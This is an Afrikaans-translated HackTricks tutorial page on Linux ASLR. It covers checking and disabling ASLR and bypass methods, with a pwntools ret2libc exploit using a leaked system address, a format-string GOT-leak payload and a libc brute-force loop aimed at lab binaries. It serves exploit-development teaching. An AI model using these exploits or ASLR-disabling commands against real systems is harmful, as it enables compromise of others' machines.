# ASLR

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basiese Inligting

**Address Space Layout Randomization (ASLR)** is 'n sekuriteitstegniek wat in bedryfstelsels gebruik word om die **geheue adresse** wat deur stelsels en toepassingsprosesse gebruik word, te **randomiseer**. Deur dit te doen, maak dit dit aansienlik moeiliker vir 'n aanvaller om die ligging van spesifieke prosesse en data, soos die stapel, hoop en biblioteke, te voorspel, wat sekere tipes eksploit te verminder, veral buffer oorgeloop.

### **Kontroleer ASLR Status**

Om die ASLR-status op 'n Linux-stelsel te **kontroleer**, kan jy die waarde uit die `/proc/sys/kernel/randomize_va_space`-l√™er lees. Die waarde wat in hierdie l√™er gestoor is, bepaal die tipe ASLR wat toegepas word:

* **0**: Geen randomisering. Alles is staties.
* **1**: Konserwatiewe randomisering. Gedeelde biblioteke, stapel, mmap(), VDSO-bladsy is gerandomiseer.
* **2**: Volledige randomisering. Benewens elemente wat deur konserwatiewe randomisering gerandomiseer is, is geheue wat deur `brk()` bestuur word, gerandomiseer.

Jy kan die ASLR-status met die volgende opdrag kontroleer:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Deaktiveer ASLR**

Om ASLR te **deaktiveer**, stel jy die waarde van `/proc/sys/kernel/randomize_va_space` op **0**. Dit is oor die algemeen nie aanbeveel om ASLR te deaktiveer buite toets- of foutopsporingstoestande nie. Hier is hoe jy dit kan deaktiveer:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
U kan ASLR ook vir 'n uitvoering deaktiveer met:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Aktivering van ASLR**

Om ASLR te **aktiver**, kan jy 'n waarde van **2** na die `/proc/sys/kernel/randomize_va_space` l√™er skryf. Dit vereis gewoonlik wortelregte. Volledige randomisering kan gedoen word met die volgende opdrag:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Volharding Oor Herlaaiings**

Veranderings gemaak met die `echo` opdragte is tydelik en sal teruggestel word by herlaai. Om die verandering volhardend te maak, moet jy die `/etc/sysctl.conf` l√™er wysig en die volgende lyn byvoeg of aanpas:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Na die redigering van `/etc/sysctl.conf`, pas die veranderinge toe met:
```bash
sudo sysctl -p
```
This will ensure that your ASLR settings remain across reboots.

## **Bypasses**

### 32bit brute-forcing

PaX verdeel die prosesadresruimte in **3 groepe**:

* **Kode en data** (ge√Ønisialiseerde en nie-ge√Ønisialiseerde): `.text`, `.data`, en `.bss` ‚Äî> **16 bits** entropie in die `delta_exec` veranderlike. Hierdie veranderlike word ewekansig ge√Ønitialiseer met elke proses en bygevoeg tot die aanvanklike adresse.
* **Geheue** toegeken deur `mmap()` en **gedeelde biblioteke** ‚Äî> **16 bits**, genoem `delta_mmap`.
* **Die stapel** ‚Äî> **24 bits**, verwys as `delta_stack`. Dit gebruik egter effektief **11 bits** (van die 10de tot die 20ste byte insluitend), uitgelijn op **16 bytes** ‚Äî> Dit lei tot **524,288 moontlike werklike stapeladresse**.

Die vorige data is vir 32-bis stelsels en die verminderde finale entropie maak dit moontlik om ASLR te omseil deur die uitvoering herhaaldelik te probeer totdat die eksploitasie suksesvol voltooi word.

#### Brute-force idees:

* As jy 'n groot genoeg oorgang het om 'n **groot NOP-slee voor die shellcode** te huisves, kan jy eenvoudig adresse in die stapel brute-force totdat die vloei **oor 'n deel van die NOP-slee spring**.
* 'n Ander opsie hiervoor, in die geval die oorgang nie so groot is nie en die eksploitasie plaaslik uitgevoer kan word, is om **die NOP-slee en shellcode in 'n omgewingsveranderlike** by te voeg.
* As die eksploitasie plaaslik is, kan jy probeer om die basisadres van libc te brute-force (nuttig vir 32-bis stelsels):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* As jy 'n afstandsbediening bediener aanval, kan jy probeer om die **adres van die `libc` funksie `usleep` te brute-force**, met 10 (byvoorbeeld) as argument. As die **bediener op 'n stadium 10s ekstra neem om te antwoord**, het jy die adres van hierdie funksie gevind.

{% hint style="success" %}
In 64-bit stelsels is die entropie baie ho√´r en dit is nie moontlik nie.
{% endhint %}

### Plaaslike Inligting (`/proc/[pid]/stat`)

Die l√™er **`/proc/[pid]/stat`** van 'n proses is altyd deur almal leesbaar en dit **bevat interessante** inligting soos:

* **startcode** & **endcode**: Adresse bo en onder met die **TEKS** van die bin√™re
* **startstack**: Die adres van die begin van die **stapel**
* **start\_data** & **end\_data**: Adresse bo en onder waar die **BSS** is
* **kstkesp** & **kstkeip**: Huidige **ESP** en **EIP** adresse
* **arg\_start** & **arg\_end**: Adresse bo en onder waar **cli argumente** is.
* **env\_start** &**env\_end**: Adresse bo en onder waar **omgewing veranderlikes** is.

Daarom, as die aanvaller op dieselfde rekenaar is as die bin√™re wat uitgebuit word en hierdie bin√™re nie die oorgang van ru-argumente verwag nie, maar van 'n ander **invoer wat na die lees van hierdie l√™er saamgestel kan word**. Dit is moontlik vir 'n aanvaller om **'n paar adresse uit hierdie l√™er te kry en offsets daaruit vir die uitbuiting te konstrueer**.

{% hint style="success" %}
Vir meer inligting oor hierdie l√™er, kyk na [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) en soek vir `/proc/pid/stat`
{% endhint %}

### Om 'n lek te h√™

* **Die uitdaging is om 'n lek te gee**

As jy 'n lek gegee word (maklike CTF-uitdagings), kan jy offsets daaruit bereken (veronderstel byvoorbeeld dat jy die presiese libc weergawe weet wat in die stelsel wat jy aan die aanval is, gebruik word). Hierdie voorbeeld uitbuiting is uit die [**voorbeeld hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (kyk na daardie bladsy vir meer besonderhede):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

Deur 'n buffer overflow te misbruik, sal dit moontlik wees om 'n **ret2plt** te exploiteer om 'n adres van 'n funksie uit die libc te exfiltreer. Kyk:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

Net soos in ret2plt, as jy 'n arbitr√™re lees via 'n formaat string kwesbaarheid het, is dit moontlik om die adres van 'n **libc funksie** uit die GOT te exfiltreer. Die volgende [**voorbeeld is van hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
You can find more info about Format Strings arbitrary read in:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

Probeer om ASLR te omseil deur adresse binne die stapel te misbruik:

{% content-ref url="../../stack-overflow/ret2ret.md" %}
[ret2ret.md](../../stack-overflow/ret2ret.md)
{% endcontent-ref %}

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
